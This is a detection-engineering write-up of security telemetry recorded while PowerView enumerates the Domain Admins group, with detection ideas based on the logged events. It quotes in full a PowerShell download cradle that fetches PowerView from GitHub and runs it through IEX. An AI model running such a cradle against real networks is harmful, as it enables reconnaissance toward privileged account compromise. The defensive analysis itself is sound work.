# T1069.002-12: Domain Groups — Get-DomainGroupMember with PowerView

## Technique Context

T1069.002 (Domain Groups) with PowerView's `Get-DomainGroupMember` represents a more sophisticated approach to domain group enumeration than native AD cmdlets. PowerView is a PowerShell reconnaissance framework from the PowerSploit suite, widely used by both red teams and real-world attackers. `Get-DomainGroupMember` performs LDAP queries against the domain controller to enumerate membership of a specified group — in this test, "Domain Admins" — returning detailed member objects including account names, SIDs, and membership flags.

Targeting "Domain Admins" membership enumeration is a high-priority reconnaissance goal: knowing who holds domain admin rights immediately identifies the most valuable accounts to compromise. PowerView offers richer results than native tools and is designed for automated post-exploitation workflows. The technique is also notable for its delivery mechanism — PowerView is not staged to disk but fetched live via `IEX (IWR '<url>')` from the PowerShellMafia GitHub repository, a classic living-off-the-land technique.

In the defended version of this test, Windows Defender blocked execution with `STATUS_ACCESS_DENIED` before PowerView could load. With Defender disabled, the IEX download and full PowerView execution proceed.

## What This Dataset Contains

Security EID 4688 captures the complete PowerShell attack command:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"}
```

This is the full attack chain: TLS enforcement, PowerView downloaded directly from GitHub via `Invoke-WebRequest`, immediately invoked with `IEX`, then `Get-DomainGroupMember` called against "Domain Admins". A second EID 4688 event shows a cleanup PowerShell process with an empty command block (`"powershell.exe" & {}`), confirming the execution reached completion.

The key differentiator from the defended run is that there are **no process termination events with `STATUS_ACCESS_DENIED`** and the PowerShell event count is substantially higher — 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103) versus 41 in the defended run. This increase reflects the PowerView script body being executed and logged by script block logging. The PowerView.ps1 file is approximately 7,000 lines of PowerShell; its loading via IEX would generate dozens of script block logging events capturing function definitions and module initialization, which accounts for the increased EID 4104 volume.

Sysmon provides 24 events: 15 EID 7 (image load), 3 EID 1 (process create), 3 EID 10 (process access), 2 EID 17 (pipe create), and 1 EID 8 (CreateRemoteThread). The EID 8 CreateRemoteThread event is significant — Sysmon detected `powershell.exe` (SourceImage) creating a thread in an `<unknown process>` (TargetImage at PID 2900), with `StartAddress: 0x00007FF77E8753A0`. This is tagged with `technique_id=T1055,technique_name=Process Injection` by the Sysmon ruleset. This event does not appear in the defended run and is a direct artifact of PowerView's execution environment.

## What This Dataset Does Not Contain

The 20-event Sysmon sample does not include EID 3 (network connection) events that would show the outbound connection to `raw.githubusercontent.com` to download PowerView.ps1, nor LDAP connection events to the domain controller for the `Get-DomainGroupMember` query. These events almost certainly exist in the full 24-event Sysmon dataset but fall outside the sample window.

The PowerShell channel's 20-event sample shows only ART test framework boilerplate in the script block text; the PowerView function definitions and the `Get-DomainGroupMember` execution logs are present in the full 93-event EID 4104 set but not surfaced in samples. The actual domain admin group membership results are not captured in any telemetry channel.

## Assessment

This is a high-value dataset demonstrating successful PowerView execution in an undefended environment. The contrast with the defended version is stark: blocked vs. fully executed, 41 vs. 96 PowerShell events, absent vs. present EID 8 CreateRemoteThread activity. The EID 4688 command line is the primary high-fidelity detection anchor — it contains the full download cradle URL, the PowerView target, and `Get-DomainGroupMember "Domain Admins"`. The EID 8 CreateRemoteThread artifact provides a process injection detection angle that is uniquely present in this undefended run.

This dataset is directly applicable to building and validating detections for PowerView-based domain group enumeration, IEX-based tool delivery, and the process injection signatures that PowerView generates during execution.

## Detection Opportunities Present in This Data

1. **EID 4688 / Sysmon EID 1 — PowerView download cradle**: The command line contains the full URL `https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1` and `Get-DomainGroupMember`. Either element alone is a strong indicator; the combination is definitive.

2. **EID 4104 — PowerView function definitions in script blocks**: When PowerView.ps1 is loaded via IEX, its ~7,000 lines of function definitions are logged across many EID 4104 events. Script block logging capturing function names like `Get-DomainGroupMember`, `Get-DomainGroup`, or the distinctive PowerView comment header identifies the tool.

3. **Sysmon EID 8 — CreateRemoteThread from PowerShell to unknown process**: The CreateRemoteThread event (tagged T1055) from `powershell.exe` into an `<unknown process>` at a consistent start address (`0x00007FF77E8753A0`) is absent in the defended run and present here. This address pattern may be consistent across PowerView executions and worth baselining.

4. **IEX + PowerSploit GitHub URL in any channel**: The URL `raw.githubusercontent.com/PowerShellMafia/PowerSploit/` appearing in EID 4688, EID 4104, Sysmon EID 1, or security channel process creation events should trigger regardless of which PowerView function follows.

5. **Increased EID 4104 volume from a single PowerShell process**: A PowerShell process generating significantly more script block logging events than the test framework baseline (observed: 93 events vs ~15 for test framework-only) indicates that a large script body was loaded and executed, consistent with PowerView or similar frameworks delivered via IEX.
